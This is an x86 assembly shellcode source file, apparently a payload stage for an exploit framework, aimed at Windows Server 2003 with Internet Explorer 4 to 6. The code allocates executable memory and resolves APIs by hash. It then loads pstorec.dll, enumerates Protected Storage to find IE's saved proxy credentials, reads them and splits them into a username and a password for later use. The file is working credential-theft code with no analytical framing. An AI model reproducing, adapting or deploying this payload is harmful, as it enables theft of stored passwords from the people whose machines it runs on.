;-----------------------------------------------------------------------------;
; Author: Unknown
; Compatible: Confirmed Windows Server 2003, IE Versions 4 to 6
; Version: 1.0
;-----------------------------------------------------------------------------;
[BITS 32]

; Input: EBP must be the address of 'api_call'
; Output: top element of stack will be pointer to null-terminated password and second
; will be pointer to null-terminated username of the Proxy saved in IE


;mov edx, "1_r?"
;call print_eax

jmp after_functions

alloc_memory: ; returns address to allocation in eax
  push byte 0x40         ; PAGE_EXECUTE_READWRITE
  push 0x1000            ; MEM_COMMIT
  push 0x00400000        ; Stage allocation (8Mb ought to do us)
;  push 0x00040000	 ; other sizes don't change amount allocated (?)
;  push 0x00000400
  push 0                 ; NULL as we dont care where the allocation is
  push 0xE553A458        ; hash( "kernel32.dll", "VirtualAlloc" )
  call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXE$
  ret

after_functions:

; allocate memory for variables

  alloc_ppsDataLen:
  call alloc_memory
  push eax

  alloc_ppsData:
  call alloc_memory
  push eax

  alloc_pitemName:
  call alloc_memory
  push eax

  alloc_pspEnumItems:
  call alloc_memory
  push eax

  alloc_psubTypeGUID:
  call alloc_memory
  push eax

  alloc_pEnumSubtypes:
  call alloc_memory
  push eax

  alloc_pTypeGUID:
  call alloc_memory
  push eax

  alloc_pEnumPStoreTypes:
  call alloc_memory
  push eax		 ; save on stack

  alloc_pPStore:	 
  call alloc_memory
  push eax		 ; save on stack


;mov edx, "2_r!"
;call print_eax

load_pstorec:		 ; loads the pstorec.dll
  push 0x00636572        ; Push the bytes 'pstorec',0 onto the stack.
  push 0x6f747370        ; ...
  push esp               ; Push a pointer to the 'pstorec',0 string on the stack.
  push 0x0726774C        ; hash( "kernel32.dll", "LoadLibraryA" )
  call ebp               ; LoadLibraryA( "pstorec" )
                         ; this should leave a handle to the pstorec
                         ; DLL-Module in eax
  mov ebx, eax		 ; save handle in ebx

;  add esp, 0x08
  pop edx		 ; remove string from stack
  pop edx


;mov edx, "3_r!"
;call print_eax

GetProcAddress_PStoreCreateInstance: ;we hash the function instead
;  push 0x00000000	 ; Push Bytes 'PStoreCreateInstance', 0
;  push 0x65636e61
;  push 0x74736e49
;  push 0x65746165
;  push 0x72436572
;  push 0x6f745350
;  push esp		 ; Push Pointer to this String
;  push ebx		 ; Push handle to pstorec DLL-Module
;  push 0x7802F749        ; hash  ( "kernel32.dll", "GetProcAddress" )
;  call ebp		 ; returns PStoreCreateInstance address in eax

;  add esp, 0x18
;  pop edx		 ; remove string from stack
;  pop edx
;  pop edx
;  pop edx
;  pop edx
;  pop edx

PStoreCreateInstance_PStore:; returns address to PStore (00942524) in pPStore (0012FEF4)
  pop edi		 ; pop pPstore
  push edi		 ; restore stack

  push 0
  push 0
  push 0
  push edi               ; arg4: pPstore
  push  0x2664BDDB       ; hash  ( "pstorec.dll", "PStoreCreateInstance" )
  call ebp               ; PstoreCreateInstance(address, 0, 0, 0)


;mov edx, "4_r0"
;call print_eax
;mov eax, 1

;  mov edx, "PCr0"	 ; Return value should be null for s_ok
;  call print_eax

;  mov eax, [edi]
;  mov edx, "*Pr!"
;  call print_eax

PStore.EnumTypes: 	 ; returns address to EnumPStoreTypes (00942568) in pEnumPStoreTypes (0012FEE8)
  pop eax		 ; pop pPstore
  pop edx		 ; pop pEnumPstoreTypes
  push edx		 ; push them again
  push eax

  push edx 		 ; arg1: pEnumPstoreTypes
  push 0		 ; arg2: NULL
  push 0		 ; arg3: NULL
  mov eax, [eax]	 ; load base address of PStore in eax
  push eax		 ; push base address of PStore (this)
  mov edx, ebx		 ; generate function address of IPStore::EnumTypes in pstorec.dll
  add edx, 0x00005586
  call edx		 ; call IPStore::EnumTypes

;mov edx, "5_r0"
;call print_eax
;mov eax, 1

  mov edi, 0x5e7e8100 	 ; Value of pTypeGUID if Password is IE:Password-Protected
EnumPStoreTypes.raw_Next:
  pop eax		 ; pop pPStore
  pop edx		 ; pop pEnumPStoreTypes
  pop ecx		 ; pop pTypeGUID
  push ecx		 ; push them again
  push edx
  push eax

  push 0		 ; arg1: NULL
  push ecx		 ; arg2: pTypeGUID
  push 1		 ; arg3: 1
  mov edx, [edx]	 ; load base address of EnumPStoreTypes (00942568)
  push edx		 ; push base address of EnumPStoreTypes (this)
  mov edx, ebx		 ; generate function address of EnumPStoreTypes::raw_Next in pstorec.dll
  add edx, 0x00004E4F
  call edx		 ; call EnumPStoreTypes::raw_Next

;mov edx, "6_r0"
;call print_eax
;mov eax, 1

;  mov eax, edi
;  mov edx, "EDX"
;  call print_eax

  mov eax, [esp+8]
  mov eax, [eax]
;  mov edx, "GUID"
;  call print_eax

  mov edx, 0x00000000
  cmp edx, eax
  jz no_auth 		 ; no Password found 
  cmp edi, eax		 ; do this until TypeGUID indicates "IE Password Protected sites"
  jne EnumPStoreTypes.raw_Next


PStore.EnumSubtypes:     ; returns address to EnumSubtypes () in pEnumSubtypes ()
  pop eax                ; pop pPstore
  pop edx                ; pop pEnumPstoreTypes
  pop ecx		 ; pop pTypeGUID
  pop edi		 ; pop pEnumSubtypes
  push edi               ; restore stack
  push ecx
  push edx
  push eax

  push edi               ; arg1: pEnumSubtypes
  push 0                 ; arg2: NULL
  push ecx		 ; arg3: pTypeGUID
  push 0                 ; arg4: NULL
  mov eax, [eax]         ; load base address of PStore in eax
  push eax               ; push base address of PStore (this)
  mov edx, ebx           ; generate function address of IPStore::EnumSubtypes in pstorec.dll
  add edx, 0x0000560C
  call edx               ; call IPStore::EnumSubtypes

;mov edx, "7_r0"
;call print_eax
;mov eax, 1

EnumSubtypes.raw_Next:
  mov eax, [esp+0x0C]    ; pop pEnumSubtypes
  mov edx, [esp+0x10]    ; pop psubTypeGUID

  push 0		 ; arg1: NULL
  push edx		 ; arg2: psubTypeGUID
  push 1		 ; arg3: 1
  mov eax, [eax]	 ; load base address of EnumSubtypes in eax
  push eax		 ; push base address of EnumSubtypes (this)
  mov edx, ebx           ; generate function address of raw_Next in pstorec.dll
  add edx, 0x00004E4F
  call edx               ; call EnumSubtypes.raw_Next

;mov edx, "8_r0"
;call print_eax
;mov eax, 1

PStore.EnumItems:
  pop eax		 ; pop pPstore
  pop ecx
  pop edx		 ; pop pTypeGUID
  push edx		 ; restore stack
  push ecx
  push eax
  mov ecx, [esp+0x10]    ; pop psubTypeGUID
  mov edi, [esp+0x14]	 ; pop pspEnumItems

  push edi		 ; arg1: pspEnumItems
  push 0		 ; arg2: NULL
  push ecx		 ; arg3: psubTypeGUID
  push edx		 ; arg4: pTyoeGUID
  push 0		 ; arg5: NULL
  mov eax, [eax]         ; load base address of PStore in eax
  push eax               ; push base address of PStore (this)
  mov edx, ebx           ; generate function address of IPStore::Enumitems in pstorec.dll
  add edx, 0x000056A0
  call edx               ; call IPStore::Enumitems

;mov edx, "9_r0"
;call print_eax
;mov eax, 1

spEnumItems.raw_Next:
  mov eax, [esp+0x14]    ; pop pspEnumItems
  mov ecx, [esp+0x18]    ; pop pitemName

  push 0		 ; arg1: NULL
  push ecx		 ; arg2: pitemName
  push 1		 ; arg3: 1
  mov eax, [eax]	 ; load base address of spEnumItems in eax
  push eax		 ; push base addres of spEnumItems (this)
  mov edx, ebx		 ; generate function address of raw_Next in pstorec.dll
  add edx, 0x000048D1
  call edx

;mov edx, "10r0"
;call print_eax
;mov eax, 1

PStore.ReadItem:
  pop eax		 ; pop pPStore
  push eax

  push 0		 ; arg1: NULL
  push 0		 ; arg2: NULL (stiinfo not needed)
  mov ecx, [esp+0x24]    ; pop ppsData (8. Element)
  push ecx		 ; arg3: ppsData
  mov ecx, [esp+0x2C]	 ; pop ppsDataLen
  push ecx		 ; arg4: ppsDataLen (not needed?)
  mov ecx, [esp+0x28]    ; pop pitemName (7. Element)
  mov ecx, [ecx]
  push ecx		 ; arg5: pitemName
  mov ecx, [esp+0x24]    ; pop psubTypeGUID (5. Element)
  push ecx		 ; arg6: psubTypeGUID
  mov ecx, [esp+0x20]    ; pop pTypeGUID (3. Element)
  push ecx		 ; arg7: pTypeGUID
  push 0		 ; arg8: NULL
  mov eax, [eax]	 ; load base address of PStore in eax
  push eax		 ; push base addres of PStore (this)
  mov edx, ebx           ; generate function address of IPStore::ReadItem in pstorec.dll
  add edx, 0x000042B6
  call edx

;mov edx, "11r0"
;call print_eax
;mov eax, 1

;mov edx, [esp+0x1C]
;mov edx, [edx]
;mov edx, [edx]
;mov eax, [esp+0x1C]
;mov eax, [eax]
;mov eax, [eax]
;call print_eax


split_user_pass:
  mov eax, [esp+0x1C]    ; eax = ppsData
  mov eax, [eax]	 ; now eax contains pointer to "user:pass"
  push eax		 ; push pointer to user
  mov cl, byte 0x3a		 ; load ":" in ecx
  mov dl, byte [eax]	 ; load first byte of ppsData in edx
  cmp cl, dl
  jz no_auth
  loop_split:
;  mov eax, [eax+1]
  inc eax
  mov dl, byte [eax]
  cmp cl, dl
  jnz loop_split	 ; increase eax until it points to ":"

  mov [eax], byte 0x00	 ; replace ":" with 00
  inc eax
  push eax  		 ; push pointer to pass

;pop eax
;mov eax, [esp]
;mov edx, [esp+4]
;call print_eax

;pop eax
;mov eax, [eax]
;mov edx, "13us"
;mov edx, [esp+4]
;call print_eax

no_auth:



;  mov edi, 0x00000006	  ; counter for loop
;free_memory:		  ; returns 0, which means that it failed =(
;  push 0x00008000
;  push 0x00000000
;  push 0x300F2F0B        ; hash( "kernel32.dll", "VirtualFree" )
;  call ebp
;  mov edx, "0Fr!"
;  add edx, edi
;  call print_eax
;  dec di
;  jnz free_memory
